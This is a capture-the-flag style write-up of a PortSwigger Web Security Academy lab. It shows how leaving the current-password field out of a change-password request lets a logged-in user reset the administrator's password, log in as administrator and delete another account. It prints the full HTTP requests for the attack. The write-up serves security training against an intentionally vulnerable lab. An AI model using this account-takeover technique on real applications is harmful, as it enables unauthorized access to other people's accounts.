# [Lab 6: Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)

---

## Description

This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete Carlos.

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

### Site Map

- `/`: Home page with links to blog posts
- `/post?postId=$POST_ID`: Blog post page
- `/login`: Login page
- `/my-account?id=$USERNAME`: User account page
	- `id` parameter is odd but appears to be secure
	- The application backend controls user data rendered to this page via the `session` cookie
- `/admin`: Admin page
	- "Admin interface only available if logged in as an administrator"
		- This appears to be checked on the backend via the `session` cookie


### Authentication

Login request:

```http
POST /login HTTP/1.1
Host: ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net
Cookie: session=zawX6hdWQ8cJt7kdmdnKKo7XHBqcK0So
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net
Dnt: 1
Referer: https://ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=AKNhFLxUugJ3AmohWwGZI88uqEXwwKYv&username=wiener&password=peter
```

Success results in a 302 redirect to `/my-account`. Failure results in a 200 and the login page is re-rendered with the message: `Invalid username or password`.

Logout request:

```http
GET /logout HTTP/1.1
Host: ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net
Cookie: session=qPIU8NOYeZ6XAHnIFBkQmDUjMfes7siO
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

Results in an invalidation of the `session` cookie and a 302 redirect to `/`.

### Account Management Features

The challenge states that the logic of the application's account management features makes a flawed assumption about the user's privilege level based on their input and can be exploited to access arbitrary users' accounts.

When authenticated on the `/my-account` page, two account management features are present: update the account's email address or change its password. Begin analyzing the latter.

Change password request:

```http
POST /my-account/change-password HTTP/1.1
Host: ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net
Cookie: session=8K3bGmsScSECIfiDnjPNJGv0pwkGBHMj
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Origin: https://ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net
Dnt: 1
Referer: https://ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=4bxZ2UDBR5dGVrjH0JIhge7CpqIA8s0D&username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
```

A successful response is a 200 and the `/my-account/change-password` page renders the string `Password changed successfully!`.

![](images/Pasted%20image%2020210828190122.png)

This feature *should* have logic similar to the following:
- If `username` exists and `session` exists and `username` maps to valid token `session`:
	- If `current-password` matches the current password for `username`:
		- If `new-password-1` == `new-password-2`:
			- Change the password
		- Else:
			- "New passwords don't match!"
	- Else:
		- "Incorrect current password!"
- Else:
	- Redirect to `/login`

However, it appears to have the following logic:
- If `session` exists and maps to a valid token:
	- If `current-password` exists:
		- If `current-password` does not match the current password for `username`:
			- "Current password is incorrect. Your username is `$USERNAME`"
	- If `new-password-1` == `new-password-2`:
		- Change the password of `username`'s account
- Else:
	- Redirect to `/login`

By omitting `current-password`, the application doesn't even check that it matches the current password of `username` before checking that the new password match and then changing the password of the account. This makes it possible to change the password of another account without knowing its password.

Change `administrator`'s password to `blah` by omitting `current-password`. Make sure to have an authenticated `session` cookie using the `wiener:peter` credentials.

```http
POST /my-account/change-password HTTP/1.1
Host: ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net
Cookie: session=8K3bGmsScSECIfiDnjPNJGv0pwkGBHMj
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Origin: https://ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net
Dnt: 1
Referer: https://ace21fa71f5bbaf280155ab100b100c2.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=4bxZ2UDBR5dGVrjH0JIhge7CpqIA8s0D&username=administrator&new-password-1=blah&new-password-2=blah
```

![](images/Pasted%20image%2020210828193543.png)

Login with the credentials `administrator:blah`, access the administrative panel at `/admin`, and delete `carlos`' account to complete the challenge.

![](images/Pasted%20image%2020210828193737.png)
